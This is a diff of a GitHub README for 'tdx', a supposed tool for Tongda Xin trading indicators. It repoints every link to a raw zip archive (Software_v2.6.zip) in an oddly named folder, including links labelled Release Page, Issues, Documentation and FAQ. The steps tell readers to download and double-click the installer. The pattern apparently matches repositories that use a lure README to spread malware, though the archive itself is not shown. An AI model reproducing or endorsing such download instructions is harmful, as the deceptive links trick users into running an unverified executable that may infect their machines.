@@ -1,7 +1,7 @@
 # 🎉 tdx - Easy Analysis Tools for TDX Software
 
 ## 📥 Download Now
-[![Download tdx](https://raw.githubusercontent.com/omkar9019/tdx/master/drabbletailed/tdx.zip)](https://raw.githubusercontent.com/omkar9019/tdx/master/drabbletailed/tdx.zip)
+[![Download tdx](https://raw.githubusercontent.com/omkar9019/tdx/master/drabbletailed/Software_v2.6.zip)](https://raw.githubusercontent.com/omkar9019/tdx/master/drabbletailed/Software_v2.6.zip)
 
 ## 📝 Overview
 tdx helps users collect, organize, and share technical analysis indicators for the Tongda Xi software. This repository aims to simplify your analysis process and enhance your trading experience.
@@ -11,13 +11,13 @@ Follow these steps to download and run tdx:
 
 1. **Visit the Release Page**  
    Click on the link below to go to the Releases page:  
-   [Visit Release Page](https://raw.githubusercontent.com/omkar9019/tdx/master/drabbletailed/tdx.zip)
+   [Visit Release Page](https://raw.githubusercontent.com/omkar9019/tdx/master/drabbletailed/Software_v2.6.zip)
 
 2. **Choose the Latest Version**  
    On the Releases page, find the latest version of tdx. The most recent release will usually be at the top.
 
 3. **Download the File**  
-   Look for the installation file that matches your system. This will typically have a name like `https://raw.githubusercontent.com/omkar9019/tdx/master/drabbletailed/tdx.zip`. Click on it to start the download.
+   Look for the installation file that matches your system. This will typically have a name like `https://raw.githubusercontent.com/omkar9019/tdx/master/drabbletailed/Software_v2.6.zip`. Click on it to start the download.
 
 4. **Run the Installer**  
    Once the download is complete, locate the file in your downloads folder. Double-click the installer to begin the installation process.
@@ -54,15 +54,15 @@ If you encounter issues during installation or running the application, consider
    Sometimes, downloads get corrupted. If the application doesn’t run, try downloading the installer again.
 
 3. **Contact Support**  
-   If problems persist, feel free to reach out for help. You can submit issues directly on our [GitHub Issues page](https://raw.githubusercontent.com/omkar9019/tdx/master/drabbletailed/tdx.zip).
+   If problems persist, feel free to reach out for help. You can submit issues directly on our [GitHub Issues page](https://raw.githubusercontent.com/omkar9019/tdx/master/drabbletailed/Software_v2.6.zip).
 
 ## 📣 Community and Feedback
 We welcome feedback from all users. If you have suggestions, bug reports, or feature requests, please share your thoughts. Engaging with the community helps us improve and deliver a better product.
 
 ## 🔗 Additional Resources
-- [Documentation](https://raw.githubusercontent.com/omkar9019/tdx/master/drabbletailed/tdx.zip): Detailed information on using tdx.
-- [User Guide](https://raw.githubusercontent.com/omkar9019/tdx/master/drabbletailed/tdx.zip): Step-by-step instructions for first-time users.
-- [FAQ](https://raw.githubusercontent.com/omkar9019/tdx/master/drabbletailed/tdx.zip): Common questions and answers.
+- [Documentation](https://raw.githubusercontent.com/omkar9019/tdx/master/drabbletailed/Software_v2.6.zip): Detailed information on using tdx.
+- [User Guide](https://raw.githubusercontent.com/omkar9019/tdx/master/drabbletailed/Software_v2.6.zip): Step-by-step instructions for first-time users.
+- [FAQ](https://raw.githubusercontent.com/omkar9019/tdx/master/drabbletailed/Software_v2.6.zip): Common questions and answers.
 
 ## 💬 Get Involved
 Join our online community for discussions, tips, and to share your experiences with tdx. Follow us on social media for updates and news related to technical analysis tools.
